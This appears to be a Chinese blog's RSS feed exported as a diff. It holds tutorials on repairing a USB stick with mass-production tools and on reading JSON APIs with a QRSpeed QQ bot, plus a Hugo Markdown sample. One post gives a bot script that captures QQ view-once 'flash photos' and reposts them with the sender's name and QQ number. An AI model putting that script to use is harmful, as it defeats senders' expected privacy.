+&lt;p>这篇文章从去年的10月18日开始编写，一直到今天21年的5月15日才完成，除了现实中的一些麻烦事，最主要还是我的拖延症，几个月前的计划已经排到了2022年(笑)。如您所见，本文所有操作均用手机完成(下半部分是安装在了之前的4c手机上，详情见 &lt;a class="link" href="http://wuko.top/index.php/2021/01/09/2687/" target="_blank" rel="noopener"
+>旧手机利用计划&amp;rsquo;局域网离线观看+弹幕&lt;/a>)。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>希望本篇文章能够给到您帮助，如果还有问题请留言&lt;a class="link" href="#ad" >&lt;s>或查看文章开头&lt;/s>&lt;/a>。感谢您阅读本文！共勉！&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph {"align":"right"} -->
+&lt;p>2021.5.15&lt;/p>
+&lt;!-- /wp:paragraph --></description></item><item><title>【分享】记一次成功的u盘量产</title><link>https://blog.wuko.top/posts/2021/02/17/udiskliangchan.html/</link><pubDate>Wed, 17 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2021/02/17/udiskliangchan.html/</guid><description>&lt;p>Wed, 17 Feb 2021 04:22:39 +0000&lt;/p>
+&lt;p>前情提要:家里有一个16g优盘，因不明原因计算机可识别无法读取（请插入磁盘H:/I:）&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>使用工具:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>WinXP&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>ChipGenius芯片精灵&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>SMI(慧荣)量产工具&lt;strong>*&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;span class="has-inline-color has-cyan-bluish-gray-color">（量产工具须根据u盘主控型号选择）&lt;/span>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>1，ChipGenius芯片精灵&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在互联网上搜索下载，尽量使用最新版本的芯片精灵&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>下载打开后，在&lt;strong>USB设备列表&lt;/strong>中选定u盘，下方会出现详细信息:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:code -->
+&lt;pre class="wp-block-code">&lt;code>设备描述: &amp;#91;H:]USB Mass Storage Device(USB MEMORY BAR)　
+设备类型: 大容量存储设备　
+协议版本: USB 2.00　
+当前速度: 全速(FullSpeed)　
+电力消耗: 100mA
+USB设备ID: VID = 090C PID = 3000
+设备供应商: Silicon Motion,Inc.　
+设备名称: SM3255AA MEMORY BAR
+设备修订版: 0100　
+产品型号: USB MEMORY BAR
+产品修订版: 1000　
+主控厂商: SMI(慧荣)　
+&lt;strong>主控型号: SM3257ENLT&lt;/strong> - ISP NONE
+闪存识别码: ******* - SanDisk(闪迪) - 1CE/单通道 &amp;#91;MLC] ->
+总容量 = 16GB　
+在线资料: http://dl.mydigit.net/special/up/smi.html&lt;/code>&lt;/pre>
+&lt;!-- /wp:code -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>2，量产工具&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在&lt;strong>详细信息&lt;/strong>中找到&lt;strong>主控型号&lt;/strong>，Ctrl+c复制下来，在互联网上搜索&lt;strong>型号+量产工具&lt;/strong>，比如我的是&lt;strong>SM3257ENLT量产工具&lt;/strong>。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>下载打开量产工具&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>点击&lt;strong>"Scan USB"&lt;/strong>或&lt;strong>"扫描USB"&lt;/strong>，会出现下图样式：&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/OAtlQg" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/05/03/OAtlQg.jpg"
+loading="lazy"
+alt="OAtlQg.jpg"
+>&lt;/a>&lt;/p>
+&lt;!-- wp:image {"id":59,"sizeSlug":"large","linkDestination":"attachment"} -->
+&lt;figure class="wp-block-image size-large">&lt;a href="http://wuko.top/?attachment_id=59">&lt;img src="http://wuko.top/wp-content/uploads/2021/02/Screenshot_20210217113019_compress97-1024x751.jpg" alt="" class="wp-image-59"/>&lt;/a>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>如果量产工具中未发现u盘，就再去尝试几个其它版本的量产工具，我也是试了几个量产工具后才成功。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>量产可以在&lt;strong>"Setting"&lt;/strong>或&lt;strong>"设置"&lt;/strong>中设置选项。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>选中显示Ready的项目，点击&lt;strong>开始&lt;/strong>或&lt;strong>Start&lt;/strong>，进行u盘量产，耐心等待……直到开始按钮上方出现大大的&lt;strong>OK&lt;/strong>：&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":60,"sizeSlug":"large","linkDestination":"attachment"} -->
+&lt;figure class="wp-block-image size-large">&lt;a href="http://wuko.top/?attachment_id=60">&lt;img src="http://wuko.top/wp-content/uploads/2021/02/Screenshot_20210217113256_compress78-1024x758.jpg" alt="" class="wp-image-60"/>&lt;/a>&lt;figcaption>&lt;span class="has-inline-color has-cyan-bluish-gray-color">截屏请只参考右上角OK&lt;/span>&lt;/figcaption>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>打开我的电脑，进入u盘，测试读写，成功！&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/OAtwSU" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/05/03/OAtwSU.jpg"
+loading="lazy"
+alt="OAtwSU.jpg"
+>&lt;/a>&lt;/p></description></item><item><title>【旧】QQ机器人:如何用QRspeed调用json格式的API接口</title><link>https://blog.wuko.top/posts/2020/06/20/qrbotusejson.html/</link><pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2020/06/20/qrbotusejson.html/</guid><description>&lt;p>Sat, 20 Jun 2020 02:41:12 +0000&lt;/p>
+&lt;p>我的讨论群:877789015，欢迎加群共同进步！&lt;a rel="noreferrer noopener" href="https://jq.qq.com/?_wv=1027&amp;amp;k=WHAMgWba" target="_blank">戳我加群&lt;/a>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4>一，认识JSON中的键与值&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>以下内容摘自:百度百科&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:quote -->
+&lt;blockquote class="wp-block-quote">&lt;p>JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。&lt;/p>&lt;/blockquote>
+&lt;!-- /wp:quote -->
+&lt;!-- wp:paragraph -->
+&lt;p>当然，你并不需要彻底了解JSON的格式用法，因为我们只需要用到一部分，所以你只需要记住键与值是什么意思，便于阅读下文。详情请看下图:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":82,"sizeSlug":"large"} -->
+&lt;figure class="wp-block-image size-large">&lt;img src="http://xxx/wp-content/uploads/2020/06/qrjson1.jpg" alt="" class="wp-image-82"/>&lt;figcaption>键与值&lt;/figcaption>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4>二，$访问$命令&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>想要调用api数据，就要先了解HTTP其中的两种请求方式:GET与POST。(什么是HTTP请自行使用搜索引擎，这里不多赘述)&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>GET - 从指定的资源请求数据。&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>POST - 向指定的资源提交要被处理的数据&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>通俗来讲，GET就是直接获取，而POST是向服务器发送数据，服务器再返回结果。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>那我们如何在QR的词库中应用呢？那就要用到&lt;strong>$访问$&lt;/strong>命令了。$访问$主要有两种格式，分别对应GET与POST:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>$访问 网址$&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>$访问 POST 网址 post参数$&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>因为大多数API接口都是GET方法，所以下面以GET形式为例。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4>三，应用&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>嘿嘿，我们这儿有一个API的接口，直接使用$访问 链接$或用浏览器访问，就会出现以下结果:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":83,"sizeSlug":"large"} -->
+&lt;figure class="wp-block-image size-large">&lt;img src="http://xxxxx/wp-content/uploads/2020/06/qrjson2.jpg" alt="" class="wp-image-83"/>&lt;figcaption>(静态的。。。仅供参考)&lt;/figcaption>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>但我们需要的是msg和content里的文本，那该怎么办呢？&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>先来看msg:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>API测试&lt;/strong> &lt;em>//命令&lt;/em>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>A:$访问 xxxxxxxxx$&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>B:@A[msg]&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>首先，我们先将变量A赋予$访问$命令，接下来在变量B中赋予@%A%[键名] (解释一下，取一个键的值命令为@数据[键名])，这样，我们就能获得键msg的值A了。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>那么，如何获取data中content的值呢？其实是差不多的:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":84,"sizeSlug":"large"} -->
+&lt;figure class="wp-block-image size-large">&lt;img src="http://xxxx/wp-content/uploads/2020/06/qrjson3.jpg" alt="" class="wp-image-84"/>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>我们来试试，可以看到，我们顺利的获取到了content的值:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":85,"sizeSlug":"large"} -->
+&lt;figure class="wp-block-image size-large">&lt;img src="http://xxxx/wp-content/uploads/2020/06/qrjson4.jpg" alt="" class="wp-image-85"/>&lt;/figure>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>最后补充一下，一般提供api服务的都会标明提供的API的返回格式，请求方法，请求/返回参数等，根据个人需求来运用。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":86,"sizeSlug":"large"} -->
+&lt;figure class="wp-block-image size-large">&lt;img src="http://xxxxx/wp-content/uploads/2020/06/qrjson5.jpg" alt="" class="wp-image-86"/>&lt;/figure>
+&lt;!-- /wp:image --></description></item><item><title>【旧】QQ机器人:如何利用QRSpeed查看闪照？</title><link>https://blog.wuko.top/posts/2020/05/06/qrbotshantu.html/</link><pubDate>Wed, 06 May 2020 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2020/05/06/qrbotshantu.html/</guid><description>&lt;p>Wed, 06 May 2020 16:54:26 +0000&lt;/p>
+&lt;p>我的讨论群:877789015，欢迎加群共同进步！&lt;a href="https://jq.qq.com/?_wv=1027&amp;amp;k=WHAMgWba">戳我加群&lt;/a>&lt;/p>
+&lt;h4>一，检测闪照&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:media-text {"mediaId":41,"mediaLink":"http://xxxxxxxx/?attachment_id=41","mediaType":"image","verticalAlignment":"center"} -->
+&lt;div class="wp-block-media-text alignwide is-stacked-on-mobile is-vertically-aligned-center">
+&lt;figure class="wp-block-media-text__media">&lt;img class="wp-image-41" src="http://xxxxxxx/wp-content/uploads/2020/06/IMG_20200504_144337.jpg" alt="" />&lt;/figure>
+&lt;div class="wp-block-media-text__content">&lt;!-- wp:paragraph {"align":"center"} -->
+&lt;p class="has-text-align-center">成果展示&lt;/p>
+&lt;!-- /wp:paragraph -->&lt;/div>
+&lt;/div>
+&lt;p>首先，第一行需要能够检测到闪照:&lt;/p>
+&lt;pre class="wp-block-code">&lt;code>[高级].*闪照.*&lt;/code>&lt;/pre>
+&lt;p>其中，&lt;strong>[高级]&lt;/strong>指高级信息，如闪照、xml信息等。因为在老版本QQ中，闪照消息为:[闪照]请使用新版手机QQ查看闪照。故我们只需要确定信息中有“闪照”二字，就能检测到闪照。&lt;/p>
+&lt;h4>二，获取闪照直链&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>我们已经检测到了闪照，接下来只需要把它以图片或直链形式反馈回来:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>我们要用到变量&lt;strong>%FIMG0%&lt;/strong>。%FIMG0%的用法和%IMG0%差不多，都是用来表示图片的代号。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>首先，我们先新建一个变量A，设A值为&lt;strong>1%FIMG0%&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在A的下方再创建一个变量B，值为:$取中间 Э %A%Э1Э.$&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>(这里解释下，$取中间 Э 原内容Э开头Э结尾$，所以变量B意为取变量A中1与.之间的内容，在%FIMG0%前加个1就是为了方便，因为直接%FIMG0%后内容是XXX.图片格式)&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在我们写好上面的内容后，加上下面这段前缀，就是图片的直链。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:quote -->
+&lt;blockquote class="wp-block-quote">
+&lt;p>http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0&lt;/p>
+&lt;cite>腾讯图片直链&lt;/cite>&lt;/blockquote>
+&lt;!-- /wp:quote -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4>三，发送闪照&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>图片直链有了，图片也就好发了，只要用&lt;strong>±img=图片直链/本地路径±&lt;/strong>就能把闪照发出去了！&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>例子:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>±img=http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0±&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4>四，完整实例&lt;/h4>
+&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>[hide reply_to_this="true"]&lt;/p>
+&lt;p>[高级].*闪照.*&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>A:1%FIMG0%&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:group -->
+&lt;div class="wp-block-group">
+&lt;div class="wp-block-group__inner-container">&lt;!-- wp:paragraph -->
+&lt;p>B:$取中间 Э %A%Э1Э.$±img=http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0±&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>发送者:%昵称%(%QQ%)\r&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0&lt;/p>
+&lt;!-- /wp:paragraph -->&lt;/div>
+&lt;/div>
+&lt;p>[/hide]&lt;/p>
+&lt;p>&amp;nbsp;&lt;/p></description></item><item><title>Markdown Syntax Guide</title><link>https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/</link><pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/2.jpg" alt="Featured image of post Markdown Syntax Guide" />&lt;p>This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p>
+&lt;h2 id="headings">Headings
+&lt;/h2>&lt;p>The following HTML &lt;code>&amp;lt;h1&amp;gt;&lt;/code>—&lt;code>&amp;lt;h6&amp;gt;&lt;/code> elements represent six levels of section headings. &lt;code>&amp;lt;h1&amp;gt;&lt;/code> is the highest section level while &lt;code>&amp;lt;h6&amp;gt;&lt;/code> is the lowest.&lt;/p>
+&lt;h1 id="h1">H1
+&lt;/h1>&lt;h2 id="h2">H2
+&lt;/h2>&lt;h3 id="h3">H3
+&lt;/h3>&lt;h4 id="h4">H4
+&lt;/h4>&lt;h5 id="h5">H5
+&lt;/h5>&lt;h6 id="h6">H6
+&lt;/h6>&lt;h2 id="paragraph">Paragraph
+&lt;/h2>&lt;p>Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.&lt;/p>
+&lt;p>Itatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.&lt;/p>
+&lt;h2 id="blockquotes">Blockquotes
+&lt;/h2>&lt;p>The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a &lt;code>footer&lt;/code> or &lt;code>cite&lt;/code> element, and optionally with in-line changes such as annotations and abbreviations.&lt;/p>
+&lt;h3 id="blockquote-without-attribution">Blockquote without attribution
+&lt;/h3>&lt;blockquote>
+&lt;p>Tiam, ad mint andaepu dandae nostion secatur sequo quae.
+&lt;strong>Note&lt;/strong> that you can use &lt;em>Markdown syntax&lt;/em> within a blockquote.&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="blockquote-with-attribution">Blockquote with attribution
+&lt;/h3>&lt;blockquote>
+&lt;p>Don&amp;rsquo;t communicate by sharing memory, share memory by communicating.&lt;br>
+— &lt;cite>Rob Pike&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/cite>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="tables">Tables
+&lt;/h2>&lt;p>Tables aren&amp;rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Name&lt;/th>
+&lt;th>Age&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Bob&lt;/td>
+&lt;td>27&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Alice&lt;/td>
+&lt;td>23&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="inline-markdown-within-tables">Inline Markdown within tables
+&lt;/h3>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Italics&lt;/th>
+&lt;th>Bold&lt;/th>
+&lt;th>Code&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;em>italics&lt;/em>&lt;/td>
+&lt;td>&lt;strong>bold&lt;/strong>&lt;/td>
+&lt;td>&lt;code>code&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>A&lt;/th>
+&lt;th>B&lt;/th>
+&lt;th>C&lt;/th>
+&lt;th>D&lt;/th>
+&lt;th>E&lt;/th>
+&lt;th>F&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Lorem ipsum dolor sit amet, consectetur adipiscing elit.&lt;/td>
+&lt;td>Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex.&lt;/td>
+&lt;td>Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus&lt;/td>
+&lt;td>Proin sit amet velit nec enim imperdiet vehicula.&lt;/td>
+&lt;td>Ut bibendum vestibulum quam, eu egestas turpis gravida nec&lt;/td>
+&lt;td>Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="code-blocks">Code Blocks
+&lt;/h2>&lt;h3 id="code-block-with-backticks">Code block with backticks
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;!doctype html&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span> &lt;span class="na">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Example HTML5 Document&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Test&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="code-block-indented-with-four-spaces">Code block indented with four spaces
+&lt;/h3>&lt;pre>&lt;code>&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+&amp;lt;title&amp;gt;Example HTML5 Document&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;p&amp;gt;Test&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>
+&lt;h3 id="diff-code-block">Diff code block
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-diff" data-lang="diff">&lt;span class="line">&lt;span class="cl">[dependencies.bevy]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git = &amp;#34;https://github.com/bevyengine/bevy&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rev = &amp;#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gd">- features = [&amp;#34;dynamic&amp;#34;]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gd">&lt;/span>&lt;span class="gi">+ features = [&amp;#34;jpeg&amp;#34;, &amp;#34;dynamic&amp;#34;]
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="one-line-code-block">One line code block
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>A paragraph&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="list-types">List Types
+&lt;/h2>&lt;h3 id="ordered-list">Ordered List
+&lt;/h3>&lt;ol>
+&lt;li>First item&lt;/li>
+&lt;li>Second item&lt;/li>
